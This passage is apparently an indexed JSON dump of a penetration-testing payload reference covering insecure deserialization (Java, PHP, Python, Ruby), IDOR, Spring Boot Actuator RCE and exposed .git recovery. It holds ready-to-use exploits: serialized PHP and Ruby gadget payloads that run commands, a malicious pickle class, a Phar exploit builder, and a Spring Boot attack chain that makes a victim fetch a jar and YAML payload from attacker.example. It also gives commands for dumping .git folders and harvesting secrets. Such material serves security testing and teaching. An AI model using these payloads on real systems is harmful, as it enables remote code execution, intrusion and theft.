clojure:1.8.0 CommonsBeanutils1 @frohoff commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 CommonsCollections1 @frohoff commons-collections:3.1 CommonsCollections2 @frohoff commons-collections4:4.0 CommonsCollections3 @frohoff commons-collections:3.1 CommonsCollections4 @frohoff commons-collections4:4.0 CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1 CommonsCollections6 @matthias_kaiser commons-collections:3.1 FileUpload1 @mbechler commons-fileupload:1.3.1, commons-io:2.4 file uploading Groovy1 @frohoff groovy:2.3.9 Hibernate1 @mbechler Hibernate2 @mbechler JBossInterceptors1 @matthias_kaiser javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 JRMPClient @mbechler JRMPListener @mbechler JSON1 @mbechler json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 JavassistWeld1 @matthias_kaiser javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 Jdk7u21 @frohoff Jython1 @pwntester, @cschneider4711 jython-standalone:2.5.2 MozillaRhino1 @matthias_kaiser js:1.7R2 Myfaces1 @mbechler Myfaces2 @mbechler ROME @mbechler rome:1.0 Spring1 @frohoff spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE Spring2 @mbechler spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 URLDNS @gebl jre only vuln detect Wicket1 @jacob-baines wicket-util:6.23.0, slf4j-api:1.6.4","title":"Exploit"},{"location":"Insecure%20Deserialization/Java/#burp-extensions-using-ysoserial","text":"JavaSerialKiller Java Deserialization Scanner Burp-ysoserial SuperSerial SuperSerial-Active","title":"Burp extensions using ysoserial"},{"location":"Insecure%20Deserialization/Java/#other-tools","text":"JRE8u20_RCE_Gadget JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool ysoserial-modified gadgetprobe marshalsec - Turning your data into code execution java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]] where -a - generates/tests all payloads for that marshaller -t - runs in test mode, unmarshalling the generated payloads after generating them. -v - verbose mode, e.g. also shows the generated payload in test mode. gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller. arguments - Gadget specific arguments Payload generators for the following marshallers are included: Marshaller Gadget Impact BlazeDSAMF(0|3|X) JDK only escalation to Java serialization various third party libraries RCEs Hessian|Burlap various third party RCEs Castor dependency library RCE Jackson possible JDK only RCE , various third party RCEs Java yet another third party RCE JsonIO JDK only RCE JYAML JDK only RCE Kryo third party RCEs KryoAltStrategy JDK only RCE Red5AMF(0|3) JDK only RCE SnakeYAML JDK only RCEs XStream JDK only RCEs YAMLBeans third party RCE","title":"Other tools"},{"location":"Insecure%20Deserialization/Java/#references","text":"Github - ysoserial Java-Deserialization-Cheat-Sheet - GrrrDog Understanding & practicing java deserialization exploits How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter St\u00f6ckli Jackson CVE-2019-12384: anatomy of a vulnerability class On Jackson CVEs: Don\u2019t Panic \u2014 Here is what you need to know Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin / @artsploit - 29 June 2021","title":"References"},{"location":"Insecure%20Deserialization/PHP/","text":"PHP Object injection PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The following magic methods will help you for a PHP Object injection __wakeup() when an object is unserialized. __destruct() when an object is deleted. __toString() when an object is converted to a string. Also you should check the Wrapper Phar:// in File Inclusion which use a PHP object injection. Summary General concept Authentication bypass Finding and using gadgets Real world examples PHP Phar Deserialization References General concept Vulnerable code: <?php class PHPObjectInjection{ public $inject; function __construct(){ } function __wakeup(){ if(isset($this->inject)){ eval($this->inject); } } } if(isset($_REQUEST['r'])){ $var1=unserialize($_REQUEST['r']); if(is_array($var1)){ echo \"<br/>\".$var1[0].\" - \".$var1[1]; } } else{ echo \"\"; # nothing happens here } ?> Craft a payload using existing code inside the application. # Basic serialized data a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";} # Command execution string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\" Authentication bypass Type juggling Vulnerable code: <?php $data = unserialize($_COOKIE['auth']); if ($data['username'] == $adminName && $data['password'] == $adminPassword) { $admin = true; } else { $admin = false; } Payload: a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;} Because true == \"str\" is true. Object reference Vulnerable code: <?php class Object { var $guess; var $secretCode; } $obj = unserialize($_GET['input']); if($obj) { $obj->secretCode = rand(500000,999999); if($obj->guess === $obj->secretCode) { echo \"Win\"; } } ?> Payload: O:6:\"Object\":2:{s:10:\"secretCode\";N;s:4:\"guess\";R:2;} We can do an array to like this: a:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;} Finding and using gadgets Also called \"PHP POP Chains\", they can be used to gain RCE on the system. PHPGGC is a tool built to generate the payload based on several frameworks: Laravel Symfony SwiftMailer Monolog SlimPHP Doctrine Guzzle phpggc monolog/rce1 'phpinfo();' -s PHP Phar Deserialization Using phar:// wrapper, one can trigger a deserialization on the specified file like in file_get_contents(\"phar://./archives/app.phar\") . A valid PHAR includes four elements: Stub Manifest File Contents Signature Example of a Phar creation in order to exploit a custom PDFGenerator . <?php class PDFGenerator { } //Create a new instance of the Dummy class and modify its property $dummy = new PDFGenerator(); $dummy->callback = \"passthru\"; $dummy->fileName = \"uname -a > pwned\"; //our payload // Delete any existing PHAR archive with that name @unlink(\"poc.phar\"); // Create a new archive $poc = new Phar(\"poc.phar\"); // Add all write operations to a buffer, without modifying the archive on disk $poc->startBuffering(); // Set the stub $poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\"); /* Add a new file in the archive with \"text\" as its content*/ $poc[\"file\"] = \"text\"; // Add the dummy object to the metadata. This will be serialized $poc->setMetadata($dummy); // Stop buffering and write changes to disk $poc->stopBuffering(); ?> Real world examples Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley References PHP Object Injection - OWASP Utilizing Code Reuse/ROP in PHP PHP unserialize PHP Generic Gadget - ambionics security POC2009 Shocking News in PHP Exploitation PHP Internals Book - Serialization TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec CTF writeup: PHP object injection in kaspersky CTF Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec Rusty Joomla RCE Unserialize overflow PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020 How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020","title":"PHP Object injection"},{"location":"Insecure%20Deserialization/PHP/#php-object-injection","text":"PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The following magic methods will help you for a PHP Object injection __wakeup() when an object is unserialized. __destruct() when an object is deleted. __toString() when an object is converted to a string. Also you should check the Wrapper Phar:// in File Inclusion which use a PHP object injection.","title":"PHP Object injection"},{"location":"Insecure%20Deserialization/PHP/#summary","text":"General concept Authentication bypass Finding and using gadgets Real world examples PHP Phar Deserialization References","title":"Summary"},{"location":"Insecure%20Deserialization/PHP/#general-concept","text":"Vulnerable code: <?php class PHPObjectInjection{ public $inject; function __construct(){ } function __wakeup(){ if(isset($this->inject)){ eval($this->inject); } } } if(isset($_REQUEST['r'])){ $var1=unserialize($_REQUEST['r']); if(is_array($var1)){ echo \"<br/>\".$var1[0].\" - \".$var1[1]; } } else{ echo \"\"; # nothing happens here } ?> Craft a payload using existing code inside the application. # Basic serialized data a:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";} # Command execution string(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"","title":"General concept"},{"location":"Insecure%20Deserialization/PHP/#authentication-bypass","text":"","title":"Authentication bypass"},{"location":"Insecure%20Deserialization/PHP/#type-juggling","text":"Vulnerable code: <?php $data = unserialize($_COOKIE['auth']); if ($data['username'] == $adminName && $data['password'] == $adminPassword) { $admin = true; } else { $admin = false; } Payload: a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;} Because true == \"str\" is true.","title":"Type juggling"},{"location":"Insecure%20Deserialization/PHP/#object-reference","text":"Vulnerable code: <?php class Object { var $guess; var $secretCode; } $obj = unserialize($_GET['input']); if($obj) { $obj->secretCode = rand(500000,999999); if($obj->guess === $obj->secretCode) { echo \"Win\"; } } ?> Payload: O:6:\"Object\":2:{s:10:\"secretCode\";N;s:4:\"guess\";R:2;} We can do an array to like this: a:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;}","title":"Object reference"},{"location":"Insecure%20Deserialization/PHP/#finding-and-using-gadgets","text":"Also called \"PHP POP Chains\", they can be used to gain RCE on the system. PHPGGC is a tool built to generate the payload based on several frameworks: Laravel Symfony SwiftMailer Monolog SlimPHP Doctrine Guzzle phpggc monolog/rce1 'phpinfo();' -s","title":"Finding and using gadgets"},{"location":"Insecure%20Deserialization/PHP/#php-phar-deserialization","text":"Using phar:// wrapper, one can trigger a deserialization on the specified file like in file_get_contents(\"phar://./archives/app.phar\") . A valid PHAR includes four elements: Stub Manifest File Contents Signature Example of a Phar creation in order to exploit a custom PDFGenerator . <?php class PDFGenerator { } //Create a new instance of the Dummy class and modify its property $dummy = new PDFGenerator(); $dummy->callback = \"passthru\"; $dummy->fileName = \"uname -a > pwned\"; //our payload // Delete any existing PHAR archive with that name @unlink(\"poc.phar\"); // Create a new archive $poc = new Phar(\"poc.phar\"); // Add all write operations to a buffer, without modifying the archive on disk $poc->startBuffering(); // Set the stub $poc->setStub(\"<?php echo 'Here is the STUB!'; __HALT_COMPILER();\"); /* Add a new file in the archive with \"text\" as its content*/ $poc[\"file\"] = \"text\"; // Add the dummy object to the metadata. This will be serialized $poc->setMetadata($dummy); // Stop buffering and write changes to disk $poc->stopBuffering(); ?>","title":"PHP Phar Deserialization"},{"location":"Insecure%20Deserialization/PHP/#real-world-examples","text":"Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley","title":"Real world examples"},{"location":"Insecure%20Deserialization/PHP/#references","text":"PHP Object Injection - OWASP Utilizing Code Reuse/ROP in PHP PHP unserialize PHP Generic Gadget - ambionics security POC2009 Shocking News in PHP Exploitation PHP Internals Book - Serialization TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec CTF writeup: PHP object injection in kaspersky CTF Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec Rusty Joomla RCE Unserialize overflow PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020 How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020","title":"References"},{"location":"Insecure%20Deserialization/Python/","text":"Python Deserialization Pickle The following code is a simple example of using cPickle in order to generate an auth_token which is a serialized User object. :warning: import cPickle will only work on Python 2 import cPickle from base64 import b64encode, b64decode class User: def __init__(self): self.username = \"anonymous\" self.password = \"anonymous\" self.rank = \"guest\" h = User() auth_token = b64encode(cPickle.dumps(h)) print(\"Your Auth Token : {}\").format(auth_token) The vulnerability is introduced when a token is loaded from an user input. new_token = raw_input(\"New Auth Token : \") token = cPickle.loads(b64decode(new_token)) print \"Welcome {}\".format(token.username) Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server. The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source. import cPickle, os from base64 import b64encode, b64decode class Evil(object): def __reduce__(self): return (os.system,(\"whoami\",)) e = Evil() evil_token = b64encode(cPickle.dumps(e)) print(\"Your Evil Token : {}\").format(evil_token) References Exploiting misuse of Python's \"pickle\" - Mar 20, 2011 Python Pickle Injection - Apr 30, 2017","title":"Python Deserialization"},{"location":"Insecure%20Deserialization/Python/#python-deserialization","text":"","title":"Python Deserialization"},{"location":"Insecure%20Deserialization/Python/#pickle","text":"The following code is a simple example of using cPickle in order to generate an auth_token which is a serialized User object. :warning: import cPickle will only work on Python 2 import cPickle from base64 import b64encode, b64decode class User: def __init__(self): self.username = \"anonymous\" self.password = \"anonymous\" self.rank = \"guest\" h = User() auth_token = b64encode(cPickle.dumps(h)) print(\"Your Auth Token : {}\").format(auth_token) The vulnerability is introduced when a token is loaded from an user input. new_token = raw_input(\"New Auth Token : \") token = cPickle.loads(b64decode(new_token)) print \"Welcome {}\".format(token.username) Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server. The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source. import cPickle, os from base64 import b64encode, b64decode class Evil(object): def __reduce__(self): return (os.system,(\"whoami\",)) e = Evil() evil_token = b64encode(cPickle.dumps(e)) print(\"Your Evil Token : {}\").format(evil_token)","title":"Pickle"},{"location":"Insecure%20Deserialization/Python/#references","text":"Exploiting misuse of Python's \"pickle\" - Mar 20, 2011 Python Pickle Injection - Apr 30, 2017","title":"References"},{"location":"Insecure%20Deserialization/Ruby/","text":"Ruby Deserialization Marshal.load Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5 for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done Yaml.load Vulnerable code require \"yaml\" YAML.load(File.read(\"p.yml\")) Exploitation code --- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source::SpecificFile spec: &1 !ruby/object:Gem::StubSpecification loaded_from: \"|id 1>&2\" - !ruby/object:Gem::Source::SpecificFile spec: References RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke Universal RCE with Ruby YAML.load - @_staaldraad Online access to Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab","title":"Ruby Deserialization"},{"location":"Insecure%20Deserialization/Ruby/#ruby-deserialization","text":"","title":"Ruby Deserialization"},{"location":"Insecure%20Deserialization/Ruby/#marshalload","text":"Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5 for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done","title":"Marshal.load"},{"location":"Insecure%20Deserialization/Ruby/#yamlload","text":"Vulnerable code require \"yaml\" YAML.load(File.read(\"p.yml\")) Exploitation code --- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source::SpecificFile spec: &1 !ruby/object:Gem::StubSpecification loaded_from: \"|id 1>&2\" - !ruby/object:Gem::Source::SpecificFile spec:","title":"Yaml.load"},{"location":"Insecure%20Deserialization/Ruby/#references","text":"RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke Universal RCE with Ruby YAML.load - @_staaldraad Online access to Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab","title":"References"},{"location":"Insecure%20Direct%20Object%20References/","text":"Insecure Direct Object References Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. - OWASP Summary Tools Exploit Examples References Tools Burp Suite plugin Authz Burp Suite plugin AuthMatrix Burp Suite plugin Authorize Exploit The value of a parameter is used directly to retrieve a database record. http://foo.bar/somepage?invoice=12345 The value of a parameter is used directly to perform an operation in the system http://foo.bar/changepassword?user=someuser The value of a parameter is used directly to retrieve a file system resource http://foo.bar/showImage?img=img00011 The value of a parameter is used directly to access application functionality http://foo.bar/accessPage?menuitem=12 Examples HackerOne - IDOR to view User Order Information - meals HackerOne - IDOR on HackerOne Feedback Review - japz References OWASP - Testing for Insecure Direct Object References (OTG-AUTHZ-004) OWASP - Insecure Direct Object Reference Prevention Cheat Sheet BUGCROWD - How-To: Find IDOR (Insecure Direct Object Reference) Vulnerabilities for large bounty rewards - Sam Houton IDOR tweet as any user by kedrisec Manipulation of ETH balance Viewing private Airbnb Messages Hunting Insecure Direct Object Reference Vulnerabilities for Fun and Profit (PART-1) - Mohammed Abdul Raheem - Feb 2, 2018","title":"Insecure Direct Object References"},{"location":"Insecure%20Direct%20Object%20References/#insecure-direct-object-references","text":"Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. - OWASP","title":"Insecure Direct Object References"},{"location":"Insecure%20Direct%20Object%20References/#summary","text":"Tools Exploit Examples References","title":"Summary"},{"location":"Insecure%20Direct%20Object%20References/#tools","text":"Burp Suite plugin Authz Burp Suite plugin AuthMatrix Burp Suite plugin Authorize","title":"Tools"},{"location":"Insecure%20Direct%20Object%20References/#exploit","text":"The value of a parameter is used directly to retrieve a database record. http://foo.bar/somepage?invoice=12345 The value of a parameter is used directly to perform an operation in the system http://foo.bar/changepassword?user=someuser The value of a parameter is used directly to retrieve a file system resource http://foo.bar/showImage?img=img00011 The value of a parameter is used directly to access application functionality http://foo.bar/accessPage?menuitem=12","title":"Exploit"},{"location":"Insecure%20Direct%20Object%20References/#examples","text":"HackerOne - IDOR to view User Order Information - meals HackerOne - IDOR on HackerOne Feedback Review - japz","title":"Examples"},{"location":"Insecure%20Direct%20Object%20References/#references","text":"OWASP - Testing for Insecure Direct Object References (OTG-AUTHZ-004) OWASP - Insecure Direct Object Reference Prevention Cheat Sheet BUGCROWD - How-To: Find IDOR (Insecure Direct Object Reference) Vulnerabilities for large bounty rewards - Sam Houton IDOR tweet as any user by kedrisec Manipulation of ETH balance Viewing private Airbnb Messages Hunting Insecure Direct Object Reference Vulnerabilities for Fun and Profit (PART-1) - Mohammed Abdul Raheem - Feb 2, 2018","title":"References"},{"location":"Insecure%20Management%20Interface/","text":"Insecure management interface Springboot-Actuator Actuator endpoints let you monitor and interact with your application. Spring Boot includes a number of built-in endpoints and lets you add your own. For example, the /health endpoint provides basic application health information. Some of them contains sensitive info such as : /trace - Displays trace information (by default the last 100 HTTP requests with headers). /env - Displays the current environment properties (from Spring\u2019s ConfigurableEnvironment). /heapdump - Builds and returns a heap dump from the JVM used by our application. /dump - Displays a dump of threads (including a stack trace). /logfile - Outputs the contents of the log file. /mappings - Shows all of the MVC controller mappings. These endpoints are enabled by default in Springboot 1.X. Note: Sensitive endpoints will require a username/password when they are accessed over HTTP. Since Springboot 2.X only /health and /info are enabled by default. Remote Code Execution via /env Spring is able to load external configurations in the YAML format. The YAML config is parsed with the SnakeYAML library, which is susceptible to deserialization attacks. In other words, an attacker can gain remote code execution by loading a malicious config file. Steps Generate a payload of SnakeYAML deserialization gadget. Build malicious jar git clone https://github.com/artsploit/yaml-payload.git cd yaml-payload # Edit the payload before executing the last commands (see below) javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . Edit src/artsploit/AwesomeScriptEngineFactory.java public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\"ping rce.poc.attacker.example\"); // COMMAND HERE } catch (IOException e) { e.printStackTrace(); } } Create a malicious yaml config (yaml-payload.yml) !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://attacker.example/yaml-payload.jar\"] ]] ] Host the malicious files on your server. yaml-payload.jar yaml-payload.yml Change spring.cloud.bootstrap.location to your server. POST /env HTTP/1.1 Host: victim.example:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 59 spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml Reload the configuration. POST /refresh HTTP/1.1 Host: victim.example:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 0 References Springboot - Official Documentation Exploiting Spring Boot Actuators - Veracode","title":"Insecure management interface"},{"location":"Insecure%20Management%20Interface/#insecure-management-interface","text":"","title":"Insecure management interface"},{"location":"Insecure%20Management%20Interface/#springboot-actuator","text":"Actuator endpoints let you monitor and interact with your application. Spring Boot includes a number of built-in endpoints and lets you add your own. For example, the /health endpoint provides basic application health information. Some of them contains sensitive info such as : /trace - Displays trace information (by default the last 100 HTTP requests with headers). /env - Displays the current environment properties (from Spring\u2019s ConfigurableEnvironment). /heapdump - Builds and returns a heap dump from the JVM used by our application. /dump - Displays a dump of threads (including a stack trace). /logfile - Outputs the contents of the log file. /mappings - Shows all of the MVC controller mappings. These endpoints are enabled by default in Springboot 1.X. Note: Sensitive endpoints will require a username/password when they are accessed over HTTP. Since Springboot 2.X only /health and /info are enabled by default.","title":"Springboot-Actuator"},{"location":"Insecure%20Management%20Interface/#remote-code-execution-via-env","text":"Spring is able to load external configurations in the YAML format. The YAML config is parsed with the SnakeYAML library, which is susceptible to deserialization attacks. In other words, an attacker can gain remote code execution by loading a malicious config file.","title":"Remote Code Execution via /env"},{"location":"Insecure%20Management%20Interface/#steps","text":"Generate a payload of SnakeYAML deserialization gadget. Build malicious jar git clone https://github.com/artsploit/yaml-payload.git cd yaml-payload # Edit the payload before executing the last commands (see below) javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . Edit src/artsploit/AwesomeScriptEngineFactory.java public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\"ping rce.poc.attacker.example\"); // COMMAND HERE } catch (IOException e) { e.printStackTrace(); } } Create a malicious yaml config (yaml-payload.yml) !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://attacker.example/yaml-payload.jar\"] ]] ] Host the malicious files on your server. yaml-payload.jar yaml-payload.yml Change spring.cloud.bootstrap.location to your server. POST /env HTTP/1.1 Host: victim.example:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 59 spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml Reload the configuration. POST /refresh HTTP/1.1 Host: victim.example:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 0","title":"Steps"},{"location":"Insecure%20Management%20Interface/#references","text":"Springboot - Official Documentation Exploiting Spring Boot Actuators - Veracode","title":"References"},{"location":"Insecure%20Source%20Code%20Management/","text":"Insecure source code management Git Example Recovering file contents from .git/logs/HEAD Recovering file contents from .git/index Tools Automatic recovery git-dumper.py diggit.py GoGitDumper rip-git GitHack GitTools Harvesting secrets trufflehog Yar Gitrob Gitleaks Subversion Example (Wordpress) Tools svn-extractor Bazaar Tools rip-bzr.pl bzr_dumper Mercurial Tools rip-hg.pl References Git The following examples will create either a copy of the .git or a copy of the current commit. Check for the following files, if they exist you can extract the .git folder. .git/config .git/HEAD .git/logs/HEAD Example Recovering file contents from .git/logs/HEAD Check for 403 Forbidden or directory listing to find the /.git/ directory Git saves all information in .git/logs/HEAD (try lowercase head too) powershell 0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000 clone: from https://github.com/fermayo/hello-world-lamp.git 15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000 commit: Initial. 26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000 commit: Whoops! Remove flag. 6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000 commit: Prevent directory listing. Access the commit using the hash ```powershell # create an empty .git repository git init test cd test/.git download the file wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c first byte for subdirectory, remaining bytes for filename mkdir .git/object/26 mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/ display the file git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c tree 323240a3983045cdc0dec2e88c1358e7998f2e39 parent 15ca375e54f056a576905b41a417b413c57df6eb author Michael michael@easyctf.com 1489390329 +0000 committer Michael michael@easyctf.com 1489390329 +0000 Initial. 4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39 powershell wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39 mkdir .git/object/32 mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/ git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39 040000 tree bd083286051cd869ee6485a3046b9935fbd127c0 css 100644 blob cb6139863967a752f3402b3975e97a84d152fd8f flag.txt 040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97 fonts 100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1 index.html 040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8 js 5. Read the data (flag.txt) powershell wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f mkdir .git/object/cb mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/ git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f ``` Recovering file contents from .git/index Use the git index file parser https://pypi.python.org/pypi/gin (python3). pip3 install gin gin ~/git-repo/.git/index Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file. $ gin .git/index | egrep -e \"name|sha1\" name = AWS Amazon Bucket S3/README.md sha1 = 862a3e58d138d6809405aa062249487bee074b98 name = CRLF injection/README.md sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141 Tools Automatic recovery git-dumper.py git clone https://github.com/arthaud/git-dumper pip install -r requirements.txt ./git-dumper.py http://web.site/.git ~/website diggit.py git clone https://github.com/bl4de/security-tools/ && cd security-tools/diggit ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True] ./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1 -u is remote path, where .git folder exists -t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init) -o is a hash of particular Git object to download GoGitDumper go get github.com/c-sto/gogitdumper gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/ git log git checkout rip-git git clone https://github.com/kost/dvcs-ripper perl rip-git.pl -v -u \"http://web.site/.git/\" git cat-file -p 07603070376d63d911f608120eb4b5489b507692 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2 parent 15ca375e54f056a576905b41a417b413c57df6eb author Michael <michael@easyctf.com> 1489389105 +0000 committer Michael <michael@easyctf.com> 1489389105 +0000 git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2 GitHack git clone https://github.com/lijiejie/GitHack GitHack.py http://web.site/.git/ GitTools git clone https://github.com/internetwache/GitTools ./gitdumper.sh http://target.tld/.git/ /tmp/destdir git checkout -- . Harvesting secrets trufflehog Searches through git repositories for high entropy strings and secrets, digging deep into commit history. pip install truffleHog # https://github.com/dxa4481/truffleHog truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git Yar Searches through users/organizations git repositories for secrets either by regex, entropy or both. Inspired by the infamous truffleHog. go get github.com/nielsing/yar # https://github.com/nielsing/yar yar -o orgname --both Gitrob Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files. go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef gitrob [options] target [target2] ... [targetN] Gitleaks Gitleaks provides a 